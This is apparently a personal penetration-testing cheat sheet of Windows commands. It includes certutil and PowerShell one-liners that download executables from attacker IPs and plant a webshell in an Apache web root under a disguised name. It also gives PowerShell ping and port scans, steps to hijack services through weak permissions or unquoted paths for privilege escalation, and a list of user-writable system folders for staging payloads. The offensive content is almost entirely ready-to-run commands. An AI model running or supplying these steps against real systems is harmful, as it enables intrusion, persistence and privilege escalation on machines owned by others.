  # Windows Snippets

wget for Windows:
```
certutil.exe -urlcache -f http://172.16.1.100:8001/FILE.exe OUTFILE.exe
or
powershell "(New-Object System.Net.WebClient).DownloadFile('http://HOST:PORT/webshell.php', 'C:\Apache24\htdocs\SOME_DIR\BLEND_ING.php')"
or
powershell iwr -uri 'http://10.10.16.111/FILE.exe' -Outfile C:\\Windows\\Tasks\\FILE.exe
```

check for impersonate privs and other privs:
```
whoami /priv
```

Run `dir` recursively:
```
gci -recurse .
```

Get open/connected ports
```
netstat -aon
```

# Scans
Subnet ping scan (about 5 seconds per host)
```
1..20 | % {"10.10.123.$($_): $(Test-Connection -count 1 -comp 10.10.123.$($_) -quiet)"}
```
Port scan single host ([other port scans](https://medium.com/@nallamuthu/powershell-port-scan-bf27fc754585))
```
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.123.110",$_)) "Port $_ is open!"} 2>$null
```

# Exploiting Windows Services
Listing services for weak perms and unquoted service paths ([link](https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/))
```
wmic service get name,startname,pathname
```
```
sc qc SERVICENAME # Check if BINARY_PATH_NAME calls an unquoted service path and see if is a priv esc opp
```
```
./accesschk /accepteula -uwdq "C:\DIR\FROM\ABOVE" # check write perms of a subdir of BINARY_PATH_NAME so we can commandeer the service call w our own executable
```
```
net start SERVICENAME # start the service after dropping our executable into the path
```

Kernel Priv Esc:
- save `systeminfo` output and run through the [Windows Exploit Suggester_new](https://github.com/bitsadmin/wesng)


## Tips
1. https://github.com/ankh2054/windows-pentest

__Dirs writable by default by normal users:__
```
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```
